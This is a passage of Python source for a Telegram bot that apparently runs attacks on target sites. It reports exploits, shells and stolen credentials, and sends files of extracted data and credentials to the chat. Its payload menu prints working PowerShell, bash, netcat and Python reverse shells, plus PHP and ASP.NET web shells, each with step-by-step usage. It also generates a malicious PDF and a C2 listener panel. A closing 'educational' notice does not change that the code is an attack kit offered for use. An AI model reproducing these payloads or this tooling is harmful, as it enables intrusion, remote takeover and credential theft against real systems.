🔍 **Attack Details Summary**

**Target:** `{results.get('target_url', 'Unknown')}`
**Target IP:** `{results.get('target_ip', 'Unknown')}`

**Vulnerability-Based Attacks:**
"""

        # Count attacks by vulnerability type
        vuln_types = {}
        for vuln in results.get('vulnerabilities', []):
            vuln_type = vuln['type']
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = {'count': 0, 'severity': vuln['severity']}
            vuln_types[vuln_type]['count'] += 1

        if vuln_types:
            for vuln_type, info in vuln_types.items():
                severity_emoji = {'Critical': '🔴', 'High': '🟠', 'Medium': '🟡', 'Low': '🟢'}.get(info['severity'], '⚪')
                attack_info += f"• {severity_emoji} **{vuln_type}**: {info['count']} attack(s)\n"

        # VPS/VDS Attack details
        if hasattr(self, 'vps_attack_summary'):
            attack_info += f"\n**VPS/VDS Attacks:**\n{self.vps_attack_summary}"

        # Port-based attacks
        if results.get('open_ports'):
            attack_info += f"\n**Port-Based Attacks:**\n"
            for port in results['open_ports']:
                service = results.get('services', {}).get(port, 'Unknown')
                attack_info += f"• Port {port} ({service}): Service enumeration\n"

        return attack_info

    def _generate_exploit_details(self, results: Dict) -> str:
        """Generate successful exploit information"""
        exploit_info = f"""
⚔️ **Successful Exploits Report**

**Target:** `{results.get('target_url', 'Unknown')}`
"""

        # Check for attack engine results
        if hasattr(self, 'attack_engine_results'):
            attack_results = self.attack_engine_results

            exploit_info += f"""
**Attack Statistics:**
• Total Attacks: {attack_results.get('total_attacks', 0)}
• Successful Exploits: {attack_results.get('successful_exploits', 0)}
• Failed Exploits: {attack_results.get('failed_exploits', 0)}
• Success Rate: {(attack_results.get('successful_exploits', 0) / max(attack_results.get('total_attacks', 1), 1)) * 100:.1f}%
"""

            # Data extraction results
            if attack_results.get('extracted_data'):
                exploit_info += f"\n**📊 Data Extracted:**\n"
                for i, data in enumerate(attack_results['extracted_data'][:5], 1):
                    exploit_info += f"{i}. `{data[:50]}{'...' if len(data) > 50 else ''}`\n"

            # Shells obtained
            if attack_results.get('shells_obtained'):
                exploit_info += f"\n**🐚 Shells Obtained:**\n"
                for shell in attack_results['shells_obtained']:
                    exploit_info += f"• **{shell['type']}**: {shell.get('url', shell.get('status', 'Active'))}\n"

        # VPS/VDS exploit results
        if hasattr(self, 'vps_exploit_results'):
            vps_results = self.vps_exploit_results
            if vps_results.get('successful_attacks', 0) > 0:
                exploit_info += f"\n**🚀 VPS/VDS Exploits:**\n"
                exploit_info += f"• Successful Attacks: {vps_results['successful_attacks']}\n"

                if vps_results.get('credentials_found'):
                    exploit_info += "• Credentials Found:\n"
                    for cred in vps_results['credentials_found'][:3]:
                        exploit_info += f"  - {cred.get('service', 'Unknown')}: `{cred.get('username', '')}:{cred.get('password', '')}`\n"

        return exploit_info

    def _generate_credentials_report(self, results: Dict) -> str:
        """Generate credentials discovery report"""
        creds_report = f"""
🔑 **Credentials Discovery Report**

**Target:** `{results.get('target_url', 'Unknown')}`
"""

        found_credentials = []

        # Attack engine credentials
        if hasattr(self, 'attack_engine_results') and self.attack_engine_results.get('credentials_found'):
            for cred in self.attack_engine_results['credentials_found']:
                found_credentials.append({
                    'source': 'Web Attack',
                    'data': cred.get('data', ''),
                    'location': cred.get('location', 'Unknown')
                })

        # VPS/VDS credentials
        if hasattr(self, 'vps_exploit_results') and self.vps_exploit_results.get('credentials_found'):
            for cred in self.vps_exploit_results['credentials_found']:
                found_credentials.append({
                    'source': f"{cred.get('service', 'Unknown')} Service",
                    'data': f"{cred.get('username', '')}:{cred.get('password', '')}",
                    'location': f"Port {cred.get('port', 'Unknown')}"
                })

        if found_credentials:
            creds_report += f"\n**📋 Discovered Credentials:**\n"
            for i, cred in enumerate(found_credentials[:10], 1):
                creds_report += f"{i}. **{cred['source']}**\n"
                creds_report += f"   • Data: `{cred['data']}`\n"
                creds_report += f"   • Location: {cred['location']}\n\n"

        return creds_report if found_credentials else ""

    async def _handle_payload_selection(self, query: Update, data: str):
        """Handle payload type selection"""
        user_id = query.from_user.id
        payload_type = data.split("_")[1]

        if payload_type == "pdf":
            await self._generate_malicious_pdf(query)
        elif payload_type == "powershell":
            await self._show_powershell_payloads(query)
        elif payload_type == "bash":
            await self._show_bash_payloads(query)
        elif payload_type == "python":
            await self._show_python_payloads(query)
        elif payload_type == "webshell":
            await self._show_webshell_payloads(query)
        elif payload_type == "listener":
            await self._create_listener_panel(query)

    async def _generate_malicious_pdf(self, query: Update):
        """Generate malicious PDF payload"""
        await query.edit_message_text("🎯 **Generating Malicious PDF...**")

        try:
            # Generate PDF with default settings
            result = self.payload_generator.generate_malicious_pdf("0.0.0.0", 4444, "universal")

            if result['success']:
                success_text = f"""
✅ **Malicious PDF Generated Successfully!**

**File Details:**
• **Filename:** `{result['filename']}`
• **Size:** {result['size']} bytes
• **Target OS:** {result['target_os']}
• **Listener:** {result['listener_info']}
• **SHA256:** `{result['hash'][:16]}...`

**Exploits Included:**
"""
                for exploit in result['exploits_used']:
                    success_text += f"• {exploit}\n"

                success_text += f"""
**Usage Instructions:**
"""
                for instruction in result['instructions']:
                    success_text += f"{instruction}\n"

                await query.edit_message_text(success_text, parse_mode=ParseMode.MARKDOWN)

                # Send the PDF file
                if os.path.exists(result['file_path']):
                    with open(result['file_path'], 'rb') as pdf_file:
                        await query.message.reply_document(
                            document=pdf_file,
                            filename=result['filename'],
                            caption="🎯 **Malicious PDF Payload** - Use responsibly!"
                        )
            else:
                await query.edit_message_text(f"❌ **PDF Generation Failed:** {result.get('error', 'Unknown error')}")

        except Exception as e:
            await query.edit_message_text(f"❌ **Error generating PDF:** {str(e)}")

    async def _show_powershell_payloads(self, query: Update):
        """Show PowerShell payloads"""
        payload_result = self.payload_generator.generate_additional_payloads()

        if payload_result['success']:
            powershell_text = """
💻 **PowerShell Reverse Shell Payloads**

⚠️ **For Windows targets only!**

**Basic PowerShell Reverse Shell:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Usage:**
1. Replace LHOST with your IP
2. Replace LPORT with your port
3. Execute on target Windows machine
4. Start netcat listener: `nc -lvnp LPORT`
            """

            await query.edit_message_text(powershell_text, parse_mode=ParseMode.MARKDOWN)
        else:
            await query.edit_message_text("❌ Failed to generate PowerShell payloads")

    async def _show_bash_payloads(self, query: Update):
        """Show Bash payloads"""
        bash_text = """
🐧 **Bash/Linux Reverse Shell Payloads**

**Method 1 - Bash TCP:**
```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

**Method 2 - Netcat:**
```bash
nc -e /bin/sh LHOST LPORT
```

**Method 3 - Netcat (if -e not available):**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
```

**Method 4 - Python:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

**Usage:**
1. Replace LHOST with your IP
2. Replace LPORT with your port
3. Start listener: `nc -lvnp LPORT`
4. Execute on target
        """

        await query.edit_message_text(bash_text, parse_mode=ParseMode.MARKDOWN)

    async def _show_python_payloads(self, query: Update):
        """Show Python payloads"""
        python_text = """
🐍 **Python Reverse Shell Payloads**

**Basic Python Shell:**
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("LHOST",LPORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
```

**Windows Python Shell:**
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("LHOST",LPORT))
while True:
    command = s.recv(1024).decode()
    if 'terminate' in command:
        s.close()
        break
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        s.send(CMD.stdout.read())
        s.send(CMD.stderr.read())
```

**Usage:**
1. Replace LHOST with your IP
2. Replace LPORT with your port
3. Start listener: `nc -lvnp LPORT`
4. Execute: `python shell.py`
        """

        await query.edit_message_text(python_text, parse_mode=ParseMode.MARKDOWN)

    async def _show_webshell_payloads(self, query: Update):
        """Show web shell payloads"""
        webshell_text = """
🌐 **Web Shell Payloads**

**PHP Simple Shell:**
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
```

**ASP.NET Shell:**
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="C#" runat="server">
void Page_Load(object sender, EventArgs e)
{
    string cmd = Request["cmd"];
    if (cmd != null)
    {
        Response.Write("<pre>");
        Process proc = new Process();
        proc.StartInfo.FileName = "cmd.exe";
        proc.StartInfo.Arguments = "/c " + cmd;
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();
        Response.Write(proc.StandardOutput.ReadToEnd());
        Response.Write("</pre>");
    }
}
</script>
<form><input name="cmd" size="50"><input type=submit value="Execute"></form>
```

**Usage:**
1. Upload to web server
2. Access via browser
3. Execute commands through web interface
        """

        await query.edit_message_text(webshell_text, parse_mode=ParseMode.MARKDOWN)

    async def _create_listener_panel(self, query: Update):
        """Create listener panel"""
        await query.edit_message_text("🎛️ **Creating Listener Panel...**")

        try:
            panel_result = self.payload_generator.create_listener_panel(8080)

            if panel_result['success']:
                panel_text = f"""
✅ **Listener Panel Created Successfully!**

**Panel Details:**
• **Port:** {panel_result['port']}
• **URL:** http://0.0.0.0:{panel_result['port']}/panel
• **File:** `{os.path.basename(panel_result['panel_path'])}`

**Instructions:**
"""
                for instruction in panel_result['instructions']:
                    panel_text += f"{instruction}\n"

                await query.edit_message_text(panel_text, parse_mode=ParseMode.MARKDOWN)

                # Send the panel HTML file
                if os.path.exists(panel_result['panel_path']):
                    with open(panel_result['panel_path'], 'r') as panel_file:
                        await query.message.reply_document(
                            document=io.StringIO(panel_file.read()),
                            filename="listener_panel.html",
                            caption="🎛️ **Listener Panel** - Web-based C2 interface"
                        )
            else:
                await query.edit_message_text("❌ Failed to create listener panel")

        except Exception as e:
            await query.edit_message_text(f"❌ **Error creating panel:** {str(e)}")

    async def _save_and_send_attack_data(self, update: Update, attack_results: Dict, target_url: str):
        """Save all attack data to files and send them to Telegram"""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

        try:
            # 1. Complete Attack Results JSON
            complete_results = {
                "target_url": target_url,
                "timestamp": datetime.datetime.now().isoformat(),
                "attack_summary": {
                    "total_attacks": attack_results.get('total_attacks', 0),
                    "successful_exploits": attack_results.get('successful_exploits', 0),
                    "failed_exploits": attack_results.get('failed_exploits', 0),
                    "success_rate": (attack_results.get('successful_exploits', 0) / max(attack_results.get('total_attacks', 1), 1)) * 100
                },
                "extracted_data": attack_results.get('extracted_data', []),
                "credentials_found": attack_results.get('credentials_found', []),
                "shells_obtained": attack_results.get('shells_obtained', []),
                "attack_details": attack_results.get('attack_details', []),
                "console_output": attack_results.get('console_output', [])
            }

            complete_json = json.dumps(complete_results, indent=2, ensure_ascii=False)
            complete_file = io.BytesIO(complete_json.encode('utf-8'))
            complete_file.name = f"complete_attack_results_{timestamp}.json"

            await update.message.reply_document(
                document=complete_file,
                caption="📄 **Complete Attack Results** - Full attack data in JSON format"
            )

            # 2. Extracted Data File (if any)
            if attack_results.get('extracted_data'):
                extracted_data_text = "=== EXTRACTED DATA ===\n\n"
                for i, data in enumerate(attack_results['extracted_data'], 1):
                    extracted_data_text += f"{i}. {data}\n\n"

                extracted_file = io.BytesIO(extracted_data_text.encode('utf-8'))
                extracted_file.name = f"extracted_data_{timestamp}.txt"

                await update.message.reply_document(
                    document=extracted_file,
                    caption="💾 **Extracted Data** - All data extracted during attacks"
                )

            # 3. Credentials File (if any)
            if attack_results.get('credentials_found'):
                credentials_text = "=== DISCOVERED CREDENTIALS ===\n\n"
                for i, cred in enumerate(attack_results['credentials_found'], 1):
                    credentials_text += f"{i}. Source: {cred.get('source', 'Unknown')}\n"
                    credentials_text += f"   Data: {cred.get('data', 'N/A')}\n"
                    credentials_text += f"   Location: {cred.get('location', 'Unknown')}\n\n"

                creds_file = io.BytesIO(credentials_text.encode('utf-8'))
                creds_file.name = f"credentials_{timestamp}.txt"

                await update.message.reply_document(
                    document=creds_file,
                    caption="🔑 **Discovered Credentials** - All credentials found during attacks"
                )

            # 4. Shells Information (if any)
            if attack_results.get('shells_obtained'):
                shells_text = "=== OBTAINED SHELLS ===\n\n"
                for i, shell in enumerate(attack_results['shells_obtained'], 1):
                    shells_text += f"{i}. Type: {shell.get('type', 'Unknown')}\n"
                    shells_text += f"   Status: {shell.get('status', 'Unknown')}\n"
                    shells_text += f"   Access Level: {shell.get('access_level', 'Unknown')}\n"
                    if shell.get('url'):
                        shells_text += f"   URL: {shell['url']}\n"
                    shells_text += "\n"

                shells_file = io.BytesIO(shells_text.encode('utf-8'))
                shells_file.name = f"shells_{timestamp}.txt"

                await update.message.reply_document(
                    document=shells_file,
                    caption="🐚 **Obtained Shells** - All shells obtained during attacks"
                )

            # 5. Console Log
            if attack_results.get('console_output'):
                console_text = "=== ATTACK CONSOLE LOG ===\n\n"
                console_text += "\n".join(attack_results['console_output'])

                console_file = io.BytesIO(console_text.encode('utf-8'))
                console_file.name = f"console_log_{timestamp}.txt"

                await update.message.reply_document(
                    document=console_file,
                    caption="📋 **Attack Console Log** - Real-time attack execution log"
                )

            # 6. HTML Report for easy viewing
            html_report = self._generate_attack_html_report(attack_results, target_url, timestamp)
            html_file = io.BytesIO(html_report.encode('utf-8'))
            html_file.name = f"attack_report_{timestamp}.html"

            await update.message.reply_document(
                document=html_file,
                caption="🌐 **HTML Attack Report** - Human-readable attack report"
            )

            # 7. Summary statistics
            stats_text = f"""=== ATTACK STATISTICS ===

Target: {target_url}
Timestamp: {datetime.datetime.now().isoformat()}

Total Attacks Executed: {attack_results.get('total_attacks', 0)}
Successful Exploits: {attack_results.get('successful_exploits', 0)}
Failed Exploits: {attack_results.get('failed_exploits', 0)}
Success Rate: {(attack_results.get('successful_exploits', 0) / max(attack_results.get('total_attacks', 1), 1)) * 100:.1f}%

Data Items Extracted: {len(attack_results.get('extracted_data', []))}
Credentials Found: {len(attack_results.get('credentials_found', []))}
Shells Obtained: {len(attack_results.get('shells_obtained', []))}

=== FILES GENERATED ===
✓ complete_attack_results_{timestamp}.json
✓ extracted_data_{timestamp}.txt
✓ credentials_{timestamp}.txt
✓ shells_{timestamp}.txt
✓ console_log_{timestamp}.txt
✓ attack_report_{timestamp}.html
✓ attack_stats_{timestamp}.txt
"""

            stats_file = io.BytesIO(stats_text.encode('utf-8'))
            stats_file.name = f"attack_stats_{timestamp}.txt"

            await update.message.reply_document(
                document=stats_file,
                caption="📊 **Attack Statistics** - Summary of all attack activities"
            )

        except Exception as e:
            await update.message.reply_text(f"❌ **Error saving attack data:** {str(e)}", parse_mode='Markdown')

    def _generate_attack_html_report(self, attack_results: Dict, target_url: str, timestamp: str) -> str:
        """Generate HTML report for attack results"""
        html_report = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Attack Execution Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; }}
        .header {{ text-align: center; border-bottom: 3px solid #dc3545; padding-bottom: 20px; margin-bottom: 30px; }}
        .success {{ color: #28a745; }}
        .danger {{ color: #dc3545; }}
        .warning {{ color: #fd7e14; }}
        .section {{ margin: 20px 0; padding: 15px; border: 1px solid #dee2e6; border-radius: 5px; }}
        .console {{ background-color: #000; color: #00ff00; padding: 15px; border-radius: 5px; font-family: monospace; }}
        .data-item {{ background-color: #f8f9fa; padding: 10px; margin: 5px 0; border-left: 4px solid #007bff; }}
        .credential {{ background-color: #fff3cd; padding: 10px; margin: 5px 0; border-left: 4px solid #ffc107; }}
        .shell {{ background-color: #d4edda; padding: 10px; margin: 5px 0; border-left: 4px solid #28a745; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚔️ Attack Execution Report</h1>
            <p><strong>Target:</strong> {target_url}</p>
            <p><strong>Timestamp:</strong> {timestamp}</p>
        </div>

        <div class="section">
            <h2>📊 Attack Summary</h2>
            <p><strong>Total Attacks:</strong> {attack_results.get('total_attacks', 0)}</p>
            <p><strong class="success">Successful Exploits:</strong> {attack_results.get('successful_exploits', 0)}</p>
            <p><strong class="danger">Failed Exploits:</strong> {attack_results.get('failed_exploits', 0)}</p>
            <p><strong>Success Rate:</strong> {(attack_results.get('successful_exploits', 0) / max(attack_results.get('total_attacks', 1), 1)) * 100:.1f}%</p>
        </div>
"""

        # Extracted Data Section
        if attack_results.get('extracted_data'):
            html_report += """
        <div class="section">
            <h2>💾 Extracted Data</h2>
"""
            for i, data in enumerate(attack_results['extracted_data'], 1):
                html_report += f'<div class="data-item">{i}. {data}</div>'
            html_report += "</div>"

        # Credentials Section
        if attack_results.get('credentials_found'):
            html_report += """
        <div class="section">
            <h2>🔑 Discovered Credentials</h2>
"""
            for i, cred in enumerate(attack_results['credentials_found'], 1):
                html_report += f"""
<div class="credential">
    <strong>{i}. {cred.get('source', 'Unknown')}</strong><br>
    Data: {cred.get('data', 'N/A')}<br>
    Location: {cred.get('location', 'Unknown')}
</div>"""
            html_report += "</div>"

        # Shells Section
        if attack_results.get('shells_obtained'):
            html_report += """
        <div class="section">
            <h2>🐚 Obtained Shells</h2>
"""
            for i, shell in enumerate(attack_results['shells_obtained'], 1):
                html_report += f"""
<div class="shell">
    <strong>{i}. {shell.get('type', 'Unknown')}</strong><br>
    Status: {shell.get('status', 'Unknown')}<br>
    Access Level: {shell.get('access_level', 'Unknown')}
    {f"<br>URL: {shell['url']}" if shell.get('url') else ''}
</div>"""
            html_report += "</div>"

        # Console Log Section
        if attack_results.get('console_output'):
            html_report += """
        <div class="section">
            <h2>📋 Console Output</h2>
            <div class="console">
"""
            html_report += "<br>".join(attack_results['console_output'])
            html_report += """
            </div>
        </div>
"""

        html_report += """
        <div class="section">
            <h3>⚠️ Educational Notice</h3>
            <p>This report contains results from educational vulnerability testing. All attacks were performed in a controlled environment for learning purposes only.</p>
        </div>
    </div>
</body>
</html>
"""
        return html_report

def main():
    """Main function to run the bot"""
    if not TELEGRAM_AVAILABLE:
        print("❌ Telegram dependencies not available. Please install python-telegram-bot")
        return

    # Get bot token from environment
    bot_token = os.getenv('TELEGRAM_BOT_TOKEN')

    if not bot_token:
        print("❌ Error: TELEGRAM_BOT_TOKEN not found in .env file")
        print("Please add your bot token to the .env file:")
        print("TELEGRAM_BOT_TOKEN=your_bot_token_here")
        return

    try:
        # Create bot instance
        bot = VulnerabilityTelegramBot()

        # Create application
        application = Application.builder().token(bot_token).build()

        # Add handlers
        application.add_handler(CommandHandler("start", bot.start_command))
        application.add_handler(CommandHandler("help", bot.help_command))
        application.add_handler(CommandHandler("scan", bot.scan_command))
        application.add_handler(CommandHandler("attack", bot.attack_command))
        application.add_handler(CommandHandler("osint", bot.osint_command))
        application.add_handler(CommandHandler("payload", bot.payload_command))
        application.add_handler(CommandHandler("config", bot.config_command))
        application.add_handler(CommandHandler("status", bot.status_command))
        application.add_handler(CommandHandler("stop", bot.stop_command))
        application.add_handler(CommandHandler("exploits", bot.exploits_command))
        application.add_handler(CommandHandler("credentials", bot.credentials_command))
        application.add_handler(CallbackQueryHandler(bot.button_callback))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))

        # Start the bot
        print("🤖 Starting Vulnerability Scanner Telegram Bot...")
        print("🔍 Bot is ready to scan for vulnerabilities!")

        # Run the bot
        application.run_polling()
    except Exception as e:
        print(f"❌ Error starting bot: {e}")

if __name__ == '__main__':
    main()